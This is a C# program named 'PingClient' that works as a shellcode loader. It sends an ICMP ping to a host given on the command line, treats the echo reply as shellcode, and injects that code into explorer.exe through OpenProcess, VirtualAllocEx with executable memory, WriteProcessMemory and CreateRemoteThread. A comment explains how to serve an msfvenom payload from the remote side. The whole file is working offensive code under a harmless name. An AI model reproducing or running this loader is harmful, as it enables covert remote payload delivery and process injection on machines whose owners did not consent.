using System;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;

namespace PingClient
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint processAccess, 
            bool bInheritHandle, 
            int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, 
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            IntPtr lpThreadId);
        
        static void Main(string[] args)
        {
            // Ping remote host to obtain buf byte[] in echo response buffer, e.g., by replacing "cmd" in icmpsh_m.py with python payload from msfvnm
            Ping pingClient = new Ping();
            int timeout = 10000;
            byte[] sendBuf = Encoding.UTF8.GetBytes("Hello!");
            PingOptions options = new PingOptions(64, true);
            PingReply reply = pingClient.Send(args[0], timeout, sendBuf, options);
            byte[] buf = reply.Buffer;
            Console.Write("Received " + reply.Buffer.Length + " bytes from " + args[0] + "\n");
            Console.Write(BitConverter.ToString(buf));

            // Get PID of explorer.exe for our user and get a handle on the remote process
            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
            int iTargetPid = explorerProcesses[0].Id;
            IntPtr pTargetProcessHandle = OpenProcess(0x001F0FFF, false, iTargetPid);

            // Allocate remote process memory
            IntPtr addr = VirtualAllocEx(pTargetProcessHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Write buf to memory allocation
            IntPtr outSize;
            WriteProcessMemory(pTargetProcessHandle, addr, buf, buf.Length, out outSize);

            // Create a thread in the remote process and execute code in buf
            IntPtr hThread = CreateRemoteThread(pTargetProcessHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
